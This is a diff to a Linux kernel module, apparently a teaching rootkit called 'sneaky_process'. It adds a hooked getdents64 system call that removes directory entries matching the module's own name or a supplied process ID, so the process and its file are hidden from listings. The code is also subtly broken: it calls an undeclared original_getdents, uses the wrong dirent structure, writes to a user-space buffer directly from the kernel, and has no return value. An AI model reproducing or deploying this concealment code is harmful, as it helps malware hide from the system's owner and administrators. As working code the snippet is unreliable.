@@ -14,8 +14,8 @@
 
 #define PREFIX "sneaky_process"
 
-static int spid = 0;
-module_param(spid, int, 0);
+static char * spid = "";
+module_param(spid, charp , "");
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 MODULE_PARM_DESC(spid, "sneaky process id");
@@ -38,6 +38,30 @@ int disable_page_rw(void *ptr){
   return 0;
 }
 
+asmlinkage int (*original_getdents64)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
+
+  int byte_read = original_getdents(regs);
+  if(byte_read == 0){
+    return 0;
+  }
+  struct linux_dirent * dirent;
+
+  int pos = 0;
+  while(pos < byte_read){
+    dirent = (struct linux_dirent *)((void *)regs->si + pos);
+    char * sneaky_name = "sneaky_process";
+    if(strcmp(dirent->d_name, sneaky_name) == 0 || strcmp(dirent->d_name, spid) == 0){
+      memmove((void *)dirent, (void *)dirent + dirent->d_reclen, byte_read - pos - dirent->d_reclen);
+      byte_read -= dirent->d_reclen;
+    }
+    else{
+      pos += dirent->d_reclen;
+    }
+  }
+ 
+}
 
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
